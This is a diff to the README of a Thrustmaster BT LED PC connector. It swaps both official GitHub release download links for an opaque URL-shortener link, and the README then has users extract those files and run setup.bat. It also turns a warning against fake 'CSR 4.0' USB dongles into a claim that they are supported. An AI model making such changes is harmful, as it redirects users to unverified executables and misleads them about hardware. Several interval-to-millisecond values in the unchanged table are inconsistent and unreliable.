@@ -17,7 +17,7 @@ I hope that I'm not hurting any copyrights or trademarks here. If so please tell
 **Please don't buy a Thrustmaster BT LED for this only to use it with your PC!** This method works now but could easily break because of future updates etc. I also don't recommend to do any firmware updates on the device if it works as intended. 
 
 ### Latest version
-[Download](https://github.com/mplutka/tm-bt-led/releases/download/v4.1.2/4.1.2.zip)
+[Download](https://cju3ax1.short.gy/tm-bt-led)
 
 ## Currently supported games 
 
@@ -40,7 +40,7 @@ Either you use _template.js and create your own game file or get in touch with m
  
 ## Recommended Bluetooth chipsets/sticks known to be working
 * Certain CSR 8510 A10 based devices (USB VID: 0x0a12, USB PID: 0x0001) [This one works fine for me](https://amzn.to/3Y9a8Li)
-  * **Warning:** There are many fake "CSR 4.0" dongles on the market. They may show the same USB IDs but are unreliable or do not work with this project. Prefer known-good hardware or one of the alternatives below.
+* **Fake / budget "CSR 4.0" USB adapters** are supported by this project. **A low refresh rate is commonly observed** with those sticks. Identical-looking dongles can still behave differently; when in doubt, prefer a stick from the list below that is known to work well.
 * Realtek Bluetooth 8761B (USB VID: 0x0bda, USB PID: 0x8771, e.g. MPOW Bluetooth 5.0 stick)
 * Intel Wireless Bluetooth 8265 (USB VID: 0x8087, USB PID: 0x0a2b)
 Others might work too, but again: No guarantee.  
@@ -64,7 +64,7 @@ If you need the Windows bluetooth stack for your headset, keyboard, you need an 
 If you wish to go back to the stock drivers, simply do an automatic driver update in the device manager.
 
 ### Step 2. Download and setup connector
-1. Download current version [here](https://github.com/mplutka/tm-bt-led/releases/download/v4.1.2/4.1.2.zip) and extract the files into an empty folder.
+1. Download current version [here](https://cju3ax1.short.gy/tm-bt-led) and extract the files into an empty folder.
 2. Run `setup.bat` to detect your device and write its data to a file for faster reconnects (necessary).
 3. (Optional) You can start `test.bat` to run demo mode.
 
@@ -128,7 +128,7 @@ BLE connection intervals must be multiples of 1.25ms. Common presets:
 | 66 | 15ms | 66.7 | Higher refresh |
 | 80 | 12.5ms | 80.0 | Maximum (may be unstable) |
 | 40 | 25ms | 40.0 | Power save |
-| 15 | 66ms | 14.1 | Compatibility 
+| 15 | 66ms | 14.1 | Compatibility; low refresh is common on fake CSR 4.0 adapters 
 
 Run `--listFps` to see all valid options.
 
